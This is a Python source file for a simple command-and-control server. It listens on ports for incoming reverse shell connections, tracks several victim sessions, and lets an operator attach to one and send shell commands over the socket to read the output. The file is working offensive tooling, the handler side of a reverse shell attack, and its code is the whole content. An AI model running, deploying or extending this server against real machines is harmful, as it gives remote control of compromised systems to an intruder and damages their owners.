import socket
from select import select

class C2Server:

        connections = {}    # Stores our Shell objects w/ID as key and shell obj as val
        identifier = 1      # Used to identify shells.
        publicIP = ''       # Stores our public IP incase we need it.

        def __init__(self, publicIP, port):

                C2Server.publicIP = publicIP
                self.port = port

        def banner(self):
            '''Display banner becuase your tool is only as good as its banner'''

            print('''\033[91m
     _         _                        _   _         ____                   _           
    / \  _   _| |_ ___  _ __ ___   __ _| |_(_) ___   / ___| ___   __ _  __ _| | ___  ___ 
   / _ \| | | | __/ _ \| '_ ` _ \ / _` | __| |/ __| | |  _ / _ \ / _` |/ _` | |/ _ \/ __|
  / ___ \ |_| | || (_) | | | | | | (_| | |_| | (__  | |_| | (_) | (_| | (_| | |  __/\__ \\
 /_/   \_\__,_|\__\___/|_| |_| |_|\__,_|\__|_|\___|  \____|\___/ \__, |\__, |_|\___||___/
                                                                 |___/ |___/             

                    \t(Name randomly generated by Github)
                    \033[00m   \033[96m
                    \t\tAuthor: Chase Opsahl   \033[00m
     \033[92m               \t\tDate: 09/06/2019
                        \033[00m
                ''')

        def cmdHelp(self):
            '''Displays a list of useful commands for the user'''

            print('''
                sessions\tList active connections.
                listen <port>\tSet up a listener on a set port.
                kill <id>\tKill a current connection.
                attach <id>\tConnect to a specific session to run commands. 
                sh <cmd>\tRuns an sh command on the local system.
                help    \tDisplay command options.
                clear   \tClear screen.
                exit    \tExit Server, close all current connections.
                ''')

        def addConnection(self, newSession):
            '''Adds a new connection to our dictionary of connections'''
            
            C2Server.connections[C2Server.identifier] = newSession
            C2Server.identifier += 1

        def getShell(self, sessID):
            '''Use this to get the specific shell object tied to a session'''

            try:
                return C2Server.connections[sessID]
            except:
                print("Failed to get session!")

        def listSessions(self):
            '''List all your current sessions you have'''

            if len(C2Server.connections) > 0:
                print("\tID\tIP\t\tPort")
                print(":=======================================:")
                for k,v in C2Server.connections.items():
                    if v.ip == None:
                        print("\t{}\tListening\t{}\n".format(k,v.port))
                    else:
                        print("\t{}\t{}\t{}\n".format(k, v.ip, v.port))
            else:
                print("No current sessions!")

        def killConnection(self, sessID):
            '''Kill a specific session'''

            tempShell = self.getShell(int(sessID))
            tempShell.sock.close()
            print("Closing Socket on session {}!".format(sessID))
            del C2Server.connections[sessID]

class Shell:

    # Class that helps manage sessions and does the networking duties for sessions

    def __init__(self, port, live = 0, ip = None, sock = None, cont = 0):
        
        '''Initialize needed variables'''
        self.port = port
        self.live = live
        self.ip = ip
        self.sock = sock
        self.cont = cont

    def listenForConnection(self):
        '''Listen for incoming reverse shell connections'''

        listenSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listenSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listenSock.bind(('', int(self.port)))
        listenSock.listen(1)
        newSock, addr = listenSock.accept()
        self.ip = addr[0]
        self.live = 1
        self.sock = newSock

    def sendCmd(self):
        '''Send a shell command over a session and recieve output'''

        print("\nCtrl + C to detach from current shell!")
        while True:
            recvLen = 1
            response = ""
            
            if self.cont == 0:

                while recvLen:
                    data = self.sock.recv(4096)
                    recvLen = len(data)
                    response += data.decode()

                    if recvLen < 4096:
                        break

                print(response, end="")
            
            self.cont = 0
            try:
                cmd = input("")
                if cmd in ['q', 'quit']:
                    return 0
                    
                cmd += "\n"
                self.sock.send(cmd.encode())
            except KeyboardInterrupt:
                self.sock.send("^C".encode())
                self.cont = 1
                print("\nLeaving Shell...")
                return 0

